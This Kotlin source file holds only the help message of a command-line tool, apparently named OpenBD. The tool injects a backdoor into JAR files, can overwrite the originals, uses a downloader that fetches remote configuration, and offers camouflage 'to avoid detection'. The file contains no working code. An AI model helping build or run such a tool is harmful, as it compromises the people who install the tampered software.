package com.tmquan2508.inject.cli
const val HELP_MESSAGE = """
Usage: java -jar OpenBD.jar <command> [options]

Commands:
  --inject                  Inject the backdoor into JAR files. This is the main operation.
  --generate-config <path>  Generates a default 'config.json' file at the specified path.
  --status                  Checks the status (patched).
  --help, -h                Shows this help message.

Options for --inject:
  --config, -c <path>       Required. Path to the configuration file.
  --mode, -m <mode>         Processing mode: 'single' (default) or 'multiple'.
  --input, -i <path>        Input path. Directory for 'multiple' mode (default: 'in'), file for 'single' mode (default: 'in.jar').
  --output, -o <path>       Output path. Directory for 'multiple' mode (default: 'out'), file for 'single' mode (default: 'out.jar').
  --url, -u <url>           Optional. Custom URL for the downloader to fetch its configuration.
  --replace, -r             Replace the input file(s) instead of creating new ones in the output directory.
  --camouflage              Camouflage the backdoor to avoid detection.
  --debug, -db              Display debug log.
  --trace-errors, -tr       Display full stack trace on errors.
"""